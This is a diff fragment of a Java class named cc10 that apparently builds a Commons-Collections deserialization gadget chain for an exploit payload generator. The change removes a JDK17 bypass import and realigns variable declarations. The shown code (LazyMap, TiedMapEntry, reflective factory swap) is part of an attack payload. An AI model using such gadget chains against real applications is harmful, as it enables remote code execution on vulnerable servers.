@@ -15,8 +15,6 @@ import javax.xml.transform.Templates;
 import java.util.HashMap;
 import java.util.Map;
 
-import static com.qi4l.JYso.gadgets.utils.jdk17Bypass.patchModule;
-
 
 @Dependencies({"commons-collections:commons-collections:3.2.1"})
 public class cc10 implements ObjectPayload<Object> {
@@ -31,10 +29,10 @@ public class cc10 implements ObjectPayload<Object> {
 
         // 先放一个无关键要的 Transformer
         ConstantTransformer constantTransformer = new ConstantTransformer(1);
-        Map                 innerMap            = new HashMap();
-        LazyMap             outerMap            = (LazyMap) LazyMap.decorate(innerMap, constantTransformer);
-        TiedMapEntry        tme                 = new TiedMapEntry(outerMap, "QI4L");
-        Map                 expMap              = new HashMap();
+        Map innerMap = new HashMap();
+        LazyMap outerMap = (LazyMap) LazyMap.decorate(innerMap, constantTransformer);
+        TiedMapEntry tme = new TiedMapEntry(outerMap, "QI4L");
+        Map expMap = new HashMap();
         expMap.put(tme, "QI5L");
 
         Reflections.setFieldValue(outerMap, "factory", factoryTransformer);
